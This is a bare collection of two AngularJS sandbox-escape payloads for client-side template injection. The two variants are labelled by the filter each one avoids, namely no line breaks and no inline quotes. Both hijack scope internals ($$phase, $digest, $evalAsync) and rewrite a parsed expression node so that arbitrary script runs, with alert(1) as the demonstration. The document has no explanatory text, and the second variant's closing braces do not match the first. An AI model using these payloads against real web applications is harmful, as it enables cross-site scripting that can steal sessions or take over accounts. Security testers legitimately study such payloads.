
~~~
no \r\n

{{s=''.sub;c=s.call;b=s.bind;a=s.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}
~~~


~~~
// no inline quote
{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;$root.h1='UnaryExpression';$root.h2='(window.X?void0:(window.X=true,alert(1)))+';$root.h3='Identifier';$root.h4='foo';B=C(b,c,b);$evalAsync('astNode=pop();astNode.type=$root.h1;astNode.operator=$root.h2;astNode.argument={type:$root.h3,name:$root.h4};');m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}
~~~